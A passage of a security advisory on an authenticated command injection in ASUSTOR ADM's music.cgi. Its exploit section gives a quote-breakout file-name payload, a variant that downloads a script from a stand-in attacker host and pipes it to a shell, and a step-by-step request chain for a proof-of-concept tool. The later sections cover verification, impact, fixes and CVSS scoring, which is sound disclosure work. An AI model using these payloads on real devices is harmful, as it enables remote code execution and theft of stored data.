"  ->  %22        ;  ->  %3B        |  ->  %7C        #  ->  %23
/volume1/home/admin/x";wget attacker.example.com -O -|sh;#.mp3
  ->  %2Fvolume1%2Fhome%2Fadmin%2Fx%22%3Bwget+attacker.example.com+-O+-%7Csh%3B%23.mp3
```

## 8. Exploit Construction

### Exploit construction: the payload and why this exact shape

The stored file name must satisfy every constraint found in section 6 and break the quoting found in section 5 at the same time. The minimal proof payload is:

```text
x";id>c13m;#.mp3
```

- `x` — a valid, harmless base-name prefix so the file name looks ordinary.
- `"` — closes the double quote that the format string at `0x4035f8` opened around `%s`.
- `;` — ends the `ffmpeg` command and starts a new one.
- `id>c13m` — the injected command; it writes its output to a relative path because `/` is unavailable inside a base name.
- `;` — terminates the injected command.
- `#` — comments out the remainder of the vendor's format string (`" -v 0 -ss 0.00  -vn -f mp3 -b:a 128000 -ac 2 -`), which removes the need to balance quotes or to worry about the tail being parsed as shell syntax.
- `.mp3` — extension required so `Check_Codec_With_Ffmpeg` short-circuits and never runs `ffmpeg` on the file.

For full remote code execution rather than a marker, the injected command fetches and pipes a script. Both `/` and `:` are unavailable inside the base name, so the callback uses a bare host name on the default port:

```text
x";wget attacker.example.com -O -|sh;#.mp3
```

The characters of both payloads are drawn entirely from the set that `Try_Escaping` ignores, and neither contains `,` `:` `?` (the `act=add` delimiters) or `` ` `` `$` (the two blacklisted bytes). That is the whole trick: the vendor's escaper is bypassed by not using the two characters it looks for.

### Exploit construction: step-by-step

1. **Authenticate.** `POST /portal/apis/login.cgi?act=login` with valid credentials for the target user; read the `sid` out of the JSON response. Any valid session satisfies the fail-closed `Revive_Session` gate in `music.cgi`.
2. **Choose the payload base name.** Pick a command that is slash-free and colon-free (for example `id>marker.txt`, or `wget <host> -O -|sh`), then wrap it as `<prefix>";<command>;#<extension>` with `extension` = `.mp3`.
3. **Place the file on disk.** `POST /portal/apis/fileExplorer/upload.cgi` with multipart fields `sid`, `path` (a writable share directory such as `/volume1/home/admin`), `act=upload`, and a `file` part whose `filename` is the payload with the embedded `"` escaped as `\"` per the RFC 2388 quoted-string rule. The part body only has to look like an MP3: two frames of `ff fb 90 00` followed by zero bytes, each frame 417 bytes (`144 * 128000 / 44100`), for 834 bytes total.
4. **Ingest the path.** `GET /portal/apis/fileExplorer/music.cgi?act=add&file=<URL-encoded full path>&idx=1&sid=<SID>`. This stores the raw path at `entry + 0x84`.
5. **Trigger the sink.** `GET /portal/apis/fileExplorer/music.cgi?act=live&idx=1&start=0&sid=<SID>`. The handler runs its existence, `/`-presence and duration checks, builds the command line at `0x4029a9`, and calls `As_System` at `0x4029b6`. The injected command then executes in whatever identity the device's CGI process holds; that identity was **not measured** in this research (section 9), where uid 0 was observed only in the replication harness on the analysis host.
6. **Confirm out of band.** The HTTP response does not carry the command's output — the injection is blind at the protocol level. Confirm with either a callback to a host you control, or a marker file written to a path you can read back through the file explorer or another authenticated request. Note that the `ffmpeg` exit status is irrelevant: the injected command runs whether or not the transcode binary exists or succeeds.

### Exploit construction: constraints that will silently break a naive payload

```text
payload base name MUST NOT contain : '/'   read as a path separator by the upload / stored-path logic
payload base name MUST NOT contain : ',' ':' '?'   the act=add segment delimiters @0x4036f7
payload base name MUST NOT contain : '$' or '`'    backslash-escaped by Try_Escaping @0x44f95
payload base name MUST end with      : '.mp3'  so Check_Codec_With_Ffmpeg short-circuits
stored path MUST contain             : at least one '/'   (strrchr check in act=live)
file MUST exist on disk              : __lxstat64(1, entry + 0x21, &st)
idx MUST match                       : iVar13 = (idx - 1) * 0x484 selects the entry
start MUST be <= duration            : fVar25 <= *(entry + 0), rendered as %.2f
```

Because `$` is escaped, the usual escapes from a slash-free constraint — command substitution `$(printf '\057')`, or shell variables — are unavailable. That is why the marker lands in the CGI working directory and why callbacks use bare host names.

### Exploit construction: tooling

The repository ships a single-file, standard-library proof of concept at `exploit/asustor_adm_music_cgi_live_command_injection_rce.py`. It takes the target, credentials, destination directory, injected command (or callback host), `idx` and `start` as arguments, refuses payloads containing characters that the pre-sink filters would break, prints the exact command line the device will construct from the format string at `0x4035f8`, and then performs the four requests. Its `--dry-run` mode performs no network I/O and prints the rendered sink string plus the request plan:

```text
[payload basename] x";id>adm_marker.txt;#.mp3
[stored path] /volume1/home/admin/x";id>adm_marker.txt;#.mp3
[snprintf 0x4035f8 rendered] /usr/local/AppCentral/ffmpeg/bin/ffmpeg -i "/volume1/home/admin/x";id>adm_marker.txt;#.mp3" -v 0 -ss 0.00  -vn -f mp3 -b:a 128000 -ac 2 -
[sh -c parse] word1: /usr/local/AppCentral/ffmpeg/bin/ffmpeg -i "/volume1/home/admin/x"  | word2: id>adm_marker.txt  | word3: #.mp3" ... (commented out)
[plan 1] POST /portal/apis/login.cgi?act=login act=login&username=<user>&password=*******
[plan 2] POST /portal/apis/fileExplorer/upload.cgi multipart fields sid/path=/volume1/home/admin/act=upload and file part with filename=x\";id>adm_marker.txt;#.mp3
[plan 3] GET /portal/apis/fileExplorer/music.cgi?act=add&file=%2Fvolume1%2Fhome%2Fadmin%2Fx%22%3Bid%3Eadm_marker.txt%3B%23.mp3&idx=1&sid=%3CSID%3E
[plan 4] GET /portal/apis/fileExplorer/music.cgi?act=live&idx=1&start=0&sid=%3CSID%3E
[dry-run] nothing sent
```

The tool contains no hardcoded target: `--host`, `--user` and `--password` are mandatory, and it will not run against anything unless the operator names it.

## 9. Dynamic Verification

### Dynamic verification: what was executed, and what was not

Stating the verification boundary precisely matters more than stating the result, because no physical AS602T was used at any point:

```text
PERFORMED
  [x] firmware image extraction (shell/tar polyglot -> initramfs xz+cpio, builtin.tgz rootfs)
  [x] static analysis: disassembly and decompilation of music.cgi, libgeneral.so.0.0, libapp.so.0.0
        (radare2 with the r2ghidra 'pdg' plugin)
  [x] independent re-extraction of music.cgi + libgeneral.so.0.0 from the .img by a second
        analyst, with a raw-disassembly re-check of the sink, the argument registers
        (rcx / r8 / xmm0), the +0x84 field offset, As_System == system(), and the
        Try_Escaping blacklist  (result: CONFIRMED, confidence 0.93)
  [x] adversarial falsification pass over four angles: the sink, the data flow,
        the authentication gate and the vector  (result: NOT REFUTED, confidence 0.92)
  [x] faithful C replication of the sink semantics, compiled and executed as uid 0 on a
        generic x86-64 Linux host: VULN / CONTROL / BENIGN marker test, all three conclusive
  [x] ARM cross-check of the sibling build (see below)

NOT PERFORMED
  [ ] execution on a physical ASUSTOR AS602T appliance
  [ ] whole-system emulation of the ADM firmware (the image carries a proprietary NAS boot
        path that blocked full-system emulation; no qemu-system run of ADM was achieved)
  [ ] execution of the real music.cgi binary, or of the real libgeneral.so.0.0
  [ ] live HTTP requests to a running ADM portal: login.cgi, upload.cgi and music.cgi were
        never sent to a device, so request/response shapes come from static analysis
  [ ] observation of the on-device music list, of the CGI working directory, or of ffmpeg's
        presence and behaviour on the target
  [ ] end-to-end run of the shipped proof of concept against hardware (the tool that ships
        with this advisory is complete and runnable, and it is that tool's --dry-run mode
        which was exercised here — the script in the research record has no dry-run mode;
        neither was ever pointed at a device)
```

The consequence of that boundary is honest and worth repeating: the *injection semantics* are demonstrated by execution (the replicated sink really does run the injected command as root), and the *reachability* of that sink from HTTP is demonstrated by static evidence plus independent re-analysis, not by a captured packet exchange with a real appliance.

### Dynamic verification: the faithful sink replication

The firmware could not be run, so the sink was replicated. A small C program reproduced, line for line, the two components the finding depends on:

- the `snprintf` at `0x4029a9` — same format string as extracted from `0x4035f8`, same argument order (`ffmpeg` literal first, the attacker-supplied stored path second inside the quotes, the seek time third as `%.2f`), same 1024-byte buffer bound;
- the `As_System` / `Try_Escaping` pair from `libgeneral.so.0.0` `0x4509b` / `0x44f95` — the backslash-parity counting logic and the two-byte blacklist (`60 24 00`) were reproduced from the decompilation, including the `0x72` return that leaves the original pointer untouched.

Three cases were run against the replica: a double-quote breakout payload (VULN), a command-substitution payload (CONTROL, chosen to prove that the escaper really does work on `$`), and an ordinary file name (BENIGN, to rule out a false positive from the harness itself).

```bash
scp <replica>.c <lab-host>:<replica>.c

ssh <lab-host> 'gcc -o c13_faithful <replica>.c && rm -f c13m c13d c13b && ./c13_faithful'
```

Captured standard output of the replication run (the three marker names `c13m`, `c13d` and `c13b` are simply the harness's names for the vulnerable, control and benign marker files):

```text
running uid=0 euid=0

[VULN-quote-breakout] CMD to As_System:
  /usr/local/AppCentral/ffmpeg/bin/ffmpeg -i "/volume1/home/admin/x";id>c13m;#.mp3" -v 0 -ss 0.00  -vn -f mp3 -b:a 128000 -ac 2 -
[VULN-quote-breakout] As_System ret=32512; marker c13m CREATED
    uid=0(root) gid=0(root) groups=0(root)

[CONTROL-dollar] CMD to As_System:
  /usr/local/AppCentral/ffmpeg/bin/ffmpeg -i "/volume1/home/admin/a$(id>c13d).mp3" -v 0 -ss 0.00  -vn -f mp3 -b:a 128000 -ac 2 -
[CONTROL-dollar] As_System ret=32512; marker c13d NOT created

[BENIGN] CMD to As_System:
  /usr/local/AppCentral/ffmpeg/bin/ffmpeg -i "/volume1/home/admin/song.mp3" -v 0 -ss 0.00  -vn -f mp3 -b:a 128000 -ac 2 -
[BENIGN] As_System ret=32512; marker c13b NOT created
```

Independent readback of the markers on the same host, after the run:

```bash
ssh <lab-host> 'ls -l c13m c13d c13b 2>/dev/null; echo ---; cat c13m 2>/dev/null'
```

```text
-rw-r--r-- 1 root root 39 <timestamp elided> c13m
uid=0(root) gid=0(root) groups=0(root)
```

### Dynamic verification: reading the results

| Case | Payload file name | Marker | Interpretation |
|---|---|---|---|
| VULN | `x";id>c13m;#.mp3` | created, 39 bytes, owner `root:root`, content `uid=0(root) gid=0(root) groups=0(root)` | double-quote breakout reaches `system()` and executes as root on the replication host; the on-device process identity was not measured |
| CONTROL | `a$(id>c13d).mp3` | not created | `$` is backslash-escaped by `Try_Escaping`, so `/bin/sh` never expands it: the escaper works, and command substitution is the wrong vector |
| BENIGN | `song.mp3` | not created | no harness-induced false positive; plain file names produce no execution |

Two details of the output deserve comment because they are easy to misread:

- `ret=32512` is `127 << 8`, i.e. the shell reporting "command not found" for the `ffmpeg` invocation — the replication host has no `ffmpeg` at `/usr/local/AppCentral/ffmpeg/bin/ffmpeg`. The transcode failing is irrelevant to the finding: `;id>c13m` is a *separate command* in the same shell line and runs regardless of the first command's fate. On a real device with the AppCentral package installed, `ffmpeg` would also run and would simply fail on a nonexistent input path.
- The CONTROL case is the part that makes the vector claim specific rather than generic. It shows empirically that a payload built on `$()` is defeated by the vendor's escaper, so a reader cannot dismiss this finding as "any metacharacter would do". Only the quote breakout — a character the escaper does not consider — survives.

### Dynamic verification: convergence of the independent passes

A second pass re-extracted `music.cgi` and `libgeneral.so.0.0` from the firmware image and re-checked the raw disassembly, re-deriving: the existence of the sink at `0x4029b6`; the `snprintf` at `0x4029a9`; the argument order (`rcx` = fixed `ffmpeg` literal, `r8` = `[r12 + 0x84]` file name, `xmm0` = seek time); the `+0x84` field offset; that `As_System` is `system()`; that the `Try_Escaping` blacklist is exactly the backtick and the dollar sign; that the double-quote breakout is therefore the correct vector; and that `Revive_Session` is fail-closed, making the finding post-authentication. Result: **CONFIRMED at 0.93**. A separate falsification pass attacked the chain from the four angles the record enumerates — sink reality, data-flow continuity, gate reachability and payload charset viability — and could not refute any link: **NOT REFUTED at 0.92**. The two passes converged with no disagreement to reconcile.

### Dynamic verification: cross-architecture check of the sibling ARM build

The same code pattern was checked on the ARM sibling, AS1002T running ADM 4.0.7.RVG1 on a Marvell 88F6820 (armv7 hard-float). `music.cgi` in that build imports `As_System` and `Get_Param` and does **not** import `Get_Escaped_String_General`, and its sink format string is byte-identical in the `-i "%%s"` portion. The command string that the sink would construct, with the breakout payload inserted, was executed through the ARM user-mode emulation harness using the build's own root filesystem and shell, in the form:

```bash
qemu-arm -L <adm-arm-rootfs> /bin/busybox sh -c '<the ffmpeg command line exactly as music.cgi would build it, with ";id > /tmp/arm_music_c13;# substituted into the quoted file name>'
```

The injected command produced a root-owned marker containing `uid=0(root)`, and the benign control produced no marker. That result makes the ARM build a code-pattern match with an executed command-level demonstration; it is **not** a demonstration that the ARM build's HTTP surface behaves identically, and it is recorded with that limitation in section 10.

### Dynamic verification: housekeeping

The replication artefacts (markers and the replica source and binary) were deleted from the host after the run. No listener, container or virtual machine was left running, no service was modified on the host, and no network-facing component was created for this work.

## 10. Reachability and Security Impact

### Reachability: pre-conditions for a successful attack

- A reachable ADM management portal on TCP 8000 or 8001. This is the device's normal operating mode; the portal is what makes the NAS manageable, and it is bound by the device's own network configuration.
- Valid credentials for *any* authenticated portal user (see section 3 for the `PR:L` versus `PR:H` discussion). No administrator action, no user-interface interaction and no physical access are needed.
- A writable share directory for the payload file, which any user with a home share (for example `/volume1/home/admin`) has.
- Two HTTP requests after the upload: `act=add` then `act=live`. No race, no timing constraint, no repeated attempts and no brute force are involved — `AC:L` and `UI:N` follow directly.

The chain is deterministic rather than probabilistic: the payload contains none of the characters that any filter on the path examines, so there is no failure mode other than the pre-conditions above.

### Reachability: unauthenticated access was specifically ruled out

The finding is post-authentication because the `Revive_Session` gate is fail-closed, and that classification was actively tested rather than assumed: eleven pre-authentication portal interfaces enumerated from the companion 5.1.4 analysis were checked for shell-wrapper sinks and none exists; two independent sweeps of the unauthenticated surface (HTTP and non-HTTP) both concluded that the sink is not reachable without a session. The classification would change only if a future build exposed a pre-authentication CGI that calls `As_System`/`As_Popen`, or if an authentication-bypass defect appeared in `Revive_Session`. Neither is asserted here.

### Reachability and security impact: affected scope, stated conservatively

Getting the version scope right matters more than usual on a consumer NAS product, where an overstated range would mislead every reader and every owner who checks their device. The scope below is limited to what this research actually evidenced:

| Status | Build / hardware | Evidence |
|---|---|---|
| **Verified** | ADM 3.5.9.RWM1 on AS602T (x86-64, G1 line) | full static analysis of the shipped binaries plus the executed sink replication in section 9 |
| **Cross-checked (command level)** | ADM 4.0.7.RVG1 on AS1002T (ARM Marvell 88F6820, armv7 hard-float) | identical code pattern: `music.cgi` imports `As_System` + `Get_Param`, no `Get_Escaped_String_General` import, byte-identical `-i "%%s"` sink format; the constructed command was executed through ARM user-mode emulation with the build's own rootfs and produced a root marker |
| **Candidate, NOT verified** | other ADM builds older than 5.1.2 — the pre-Deadbolt generation — on other models | same root cause pattern is plausible, but no byte-level per-model comparison was performed; treat as unconfirmed and do not report these models as affected on the strength of this advisory |
| **Newer builds** | ADM 5.1.4 (the newest release compared) | `As_System` / `As_Popen` are exported but have **no callers** (dead code); execution moved to `Execute_Command_File` / `Execute_Command_Line` (`fork` + `execv` + tokeniser, no shell). This build was recorded as having no equivalent RCE |
| **Modern releases** | current ADM versions generally | **not tested dynamically here.** ADM 5.1.4's code was examined statically and found to have removed shell invocation (row above); no modern release was run, and no claim of any kind is made about them |

The precise statement of scope is therefore: **ADM 3.5.9.RWM1 for AS602T is verified affected; ADM 4.0.7.RVG1 for AS1002T is evidenced at the code-pattern and command-execution level; other builds older than ADM 5.1.2 — the pre-Deadbolt generation — are unverified candidates; and the newer architectural generation represented by ADM 5.1.4 removed shell invocation altogether, so it does not appear to be affected by this class of defect. No modern ADM release was tested dynamically in this work, and nothing here implies that any current version of ADM is vulnerable; the carve-out is about dynamic testing only, since ADM 5.1.4's code WAS examined statically here and was found to have `As_System`/`As_Popen` exported but dead, with execution moved to `Execute_Command_File`/`Execute_Command_Line` (`fork` + `execv` + a tokeniser).** Owners of devices that cannot be upgraded should treat section 11 as the mitigation guidance.

### Reachability and security impact: what root on the NAS means

If the on-device CGI process runs as root — the inference described in sections 2 and 9, which this research did **not** measure on a device, where uid 0 was observed only in the replication harness — then the injected command inherits that identity, and because the device is a storage appliance the impact is the whole appliance and everything stored on it:

- **Confidentiality**: read access to every volume, share and snapshot the device hosts, including other users' home shares and any backup data landed on the NAS. An authenticated low-privileged user crosses into every other user's data because there is no privilege separation between the portal role and the file system.
- **Integrity**: arbitrary write access — modification or destruction of stored data, replacement of firmware-update staging files, installation of persistent implants in the root filesystem or in scheduled tasks, and rewriting of device configuration and credential stores.
- **Availability**: the device can be stopped, rebooted, its shares unmounted, or its data encrypted or wiped. Storage appliances are high-value targets for exactly this reason, and the Deadbolt campaign against this vendor's devices is the demonstration of that interest on real deployments.
- **Pivot**: a NAS typically sits on the same LAN segment as workstations, media devices and sometimes operational equipment, and holds credentials and cached copies of other systems' data. Root on the appliance is a durable position from which to attack the rest of the network.
- **Exposure**: where the portal is published to the internet for remote access — a common configuration for consumer NAS devices — the only thing standing between an internet-based attacker and root on the device is one valid portal credential.

CVSS scope remains **Unchanged**: the vulnerable component (`music.cgi` in the ADM portal) and the impacted component (the ADM device operating system and the data it serves) belong to the same security authority. The lateral-movement consequences above are a result of holding root on the device, not of crossing into a separately-authorised system, so scope is not claimed as Changed.

### Reachability and security impact: independence of this result

This is original analysis of `music.cgi` and of `libgeneral.so.0.0`'s shell wrappers in the pre-Deadbolt ADM generation. No entry describing command injection in ADM's `music.cgi` was found in the national vulnerability database during the research, and no CVE identifier is claimed or implied by this advisory. Two things it should not be confused with:

- **The Deadbolt ransomware campaign** against ASUSTOR NAS devices. That campaign is referenced here only as the context that motivated the vendor's later architectural removal of shell invocation, and as the reason a patch diff between the pre-campaign and post-campaign builds is such an effective way to find this class of defect. No identifier is cited for that campaign work because none forms part of this research record, and no claim is made that this finding was used in it.
- **The newer-build analysis** (ADM 5.1.4), which reached the opposite conclusion: no live shell sink at all. Same vendor, same library symbol names and the same offsets — different build, different binary contents, different outcome. The distinction is the whole point of scoping this advisory to the older generation.

## 11. Fix Recommendations

The root cause is a shell being asked to interpret a formatted string containing user data, defended only by a two-character deny-list. The fixes below are ordered by how directly they remove that root cause; the first two are architectural and the vendor has already implemented both in later builds, so they are effectively backports.

### Fix recommendations: primary (remove the shell)

1. **Execute the transcoder without a shell.** Replace the `As_System` call at `0x4029b6` in `music.cgi` `act=live` with an argv-based primitive — `fork` + `execv` (or `posix_spawn`) passing `/usr/local/AppCentral/ffmpeg/bin/ffmpeg`, `-i`, the file path, and the remaining options as separate vector elements. With no shell there is no shell grammar, no quoting context to break out of, and the double quote in a file name becomes an ordinary byte. The vendor already ships exactly this primitive (`Execute_Command_Line` / `Execute_Command_File`) in newer builds, which is the strongest argument that the change is compatible with the code base.
2. **Retire the shell wrappers library-wide.** Delete `As_System` (`0x4509b`) and `As_Popen` (`0x450f1`) from `libgeneral.so.0.0`, or leave them exported but with no callers as the newer generation already does. Removing the primitive closes the whole class for every present and future call site — including the sibling `fileExplorer` handlers (`download.cgi`, `share_link.cgi`) flagged in section 4 as unanalysed candidates — instead of patching one handler at a time.

### Fix recommendations: defence in depth (if a shell must remain)

3. **Stop relying on a deny-list, and fix the deny-list while it exists.** `Try_Escaping_Characters_To_Avoid_Command_Injection` (`0x44f95`) inspects only the two bytes at `0xb25da`. A two-character blacklist cannot defend a string that is interpolated inside double quotes, because the quote itself terminates the context. Either remove the function from the security path entirely (recommendation 1 makes it unnecessary) or extend it to handle at minimum `"` `'` `;` `|` `&` `<` `>` `(` `)` newline and carriage return — and prefer a rejection policy over an escaping policy, since silently rewriting a file name changes what the user asked to play.
4. **Allow-list the file name at both ends of the path.** Enforce a strict pattern (for example `^[A-Za-z0-9._ -]+$`, or a normalised server-generated name) when the value is ingested — in `upload.cgi` for the multipart `filename` and in `music.cgi` `act=add` at the `Get_Param("file")` site (`0x401cab`) — and enforce it *again* immediately before the `snprintf` at `0x4029a9`, so that a future code path storing an unvalidated name cannot reach the sink. The library already provides a general escaping helper, `Get_Escaped_String_General`, which `music.cgi` does not import; calling it at the command-construction site is the minimum acceptable change if the shell path is retained.
5. **Never build a command from a client-supplied name.** Store uploads under a server-generated identifier (the handler already knows the destination directory and can allocate a safe name) and keep the user's chosen name purely as display metadata in the media database. The stored path at `entry + 0x84` then contains no attacker-controlled characters at all, which removes the injection channel independently of every other fix.

### Fix recommendations: reduce the blast radius

6. **Drop privileges for media handling and remove the factory credential.** A transcode child does not need uid 0 (and this research did not measure the on-device identity, section 9): run the CGI media handlers and their children under a dedicated non-root service account with access limited to the shares they must read, so that an injection in this handler does not immediately confer root on the appliance. Separately, retire the factory default administrator pair described in section 3 (a distinct CWE-798 issue) and force a credential change at first login, since that pair is what converts this post-authentication finding into a practical internet-facing attack on devices left in their shipped state.
7. **Verify the fix by measurement, not by inspection.** After a build change, confirm two things mechanically: that `music.cgi` no longer imports or calls `As_System` / `As_Popen` (a symbol-reference check against the handler binary), and that the shipped `libgeneral.so.0.0` has no callers of those two symbols anywhere in the root filesystem. Both checks are one command each on the extracted image and they are exactly the properties that distinguish the hardened generation from the affected one.

## 12. CWE and CVSS

### CWE and CVSS classification

Only CWE-78 is carried by the research record for this finding, with CWE-798 recorded separately for the factory credential pair. The remaining labels below are **this advisory's own classification** of mechanisms the record documents; they are not classifications taken from it.

- **CWE-78 — Improper Neutralization of Special Elements used in an OS Command** (primary, as recorded for this finding): the stored file path is concatenated into a command string that `As_System` hands to `system()`, i.e. to `/bin/sh -c`.
- **CWE-88 — Improper Neutralization of Argument Delimiters in a Command**: the injection works by closing the application's own double-quoted `-i "%s"` argument; the delimiter is the quote, and the quote is never neutralised.
- **CWE-184 — Incomplete List of Disallowed Values**: `Try_Escaping_Characters_To_Avoid_Command_Injection` names an injection defence but implements a two-entry blacklist (bytes `60 24 00`), which is the mechanism-level defect that allows the breakout.
- **CWE-116 — Improper Encoding or Escaping of Output**: no escaping layer exists between the `Get_Param("file")` ingest and the `snprintf` that composes the shell command; the library's general escaping helper is not imported by this handler.
- **CWE-250 — Execution with Unnecessary Privileges**: the replication harness executed as uid 0 on the analysis host and its `system()` child inherited that identity; the on-device process identity was not measured and root on the device is an inference (sections 2 and 9). Under either identity, a media-streaming feature that invokes a shell is granted more privilege than streaming a file requires.
- **CWE-798 — Use of Hard-coded Credentials** (*separate finding, reported apart from this one*): the factory default `admin` / `admin` pair on this build. It is not part of the injection chain and is not used to justify any metric value below.

### CWE and CVSS score

```text
CVSS version 3.1
AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  =  8.8 (High)
```

Computed from first principles with the CVSS 3.1 base-score algorithm:

- Impact sub-score: `ISS = 1 - ((1 - 0.56) * (1 - 0.56) * (1 - 0.56)) = 1 - 0.085184 = 0.914816`; Scope Unchanged, so `Impact = 6.42 * 0.914816 = 5.873119`.
- Exploitability sub-score: `8.22 * AV:N(0.85) * AC:L(0.77) * PR:L scope-unchanged(0.62) * UI:N(0.85) = 2.835255`.
- Base score: `5.873119 + 2.835255 = 8.708373`, rounded up to the nearest tenth (the CVSS roundup rule) = **8.8**.

The same vector with `PR:H` substituted is the conditional figure discussed in section 3, and it is quoted here only with its own vector so that the two are never conflated:

```text
AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H  =  7.2 (High)
```

(That value computes to `5.873119 + 1.234708 = 7.107826`, which rounds up to 7.2.)

Metric justification, each from evidence rather than convention:

- **AV:N** — the entire chain is HTTP(S) against the management portal on TCP 8001 / 8000; no local or adjacent access is required.
- **AC:L** — no race, no timing window, no brute force, no unusual configuration and no attacker-dependent state beyond a valid session; the payload deterministically survives every filter on the path (proved by the CONTROL/BENIGN cases in section 9).
- **PR:L** — a valid portal session is mandatory (`Revive_Session` fail-closed) and no role restriction was found in the handler, so the required privilege is that of an authenticated user. Choosing `PR:H` would require evidence that the media endpoints are confined to administrators; that evidence was not found, and the higher-scoring choice was not made for its score.
- **UI:N** — the victim does nothing; the attacker's own session is sufficient.
- **S:U** — vulnerable and impacted components are the same device and the same security authority (see section 10). Scope Changed would be a misreading of "root on the NAS also lets me attack other hosts".
- **C:H / I:H / A:H** — command execution in the CGI process's identity (uid 0 measured in the replication harness, inferred for the device and not measured there, sections 2 and 9) on a storage appliance gives full read, full write and full control of availability over the device and the data it holds.

**Agreement with the recorded figure.** The score recorded during research for this finding matches the vector it was recorded against, so no divergence between a recorded figure and a recomputed figure has to be disclosed here: vector `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = 8.8 under the CVSS 3.1 algorithm, and 8.8 is the figure published throughout this advisory.

An unauthenticated variant of the same sink would be scored `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8, but that vector does not describe this finding and is not claimed anywhere in this document, because the `Revive_Session` gate is fail-closed and the unauthenticated route was searched for and ruled out (sections 3 and 10).

---

*Research and write-up by the 0day Rubbish team. Technical detail published with a working proof of concept, and with the verification boundary stated in full.*

- Advisory: https://0day-rubbish.com/blog/asustor-adm-music-cgi-live-command-injection
- Repository: https://github.com/Exploit-Garbage/0day-Rubbish
- Contact: disclosure@0day-rubbish.com
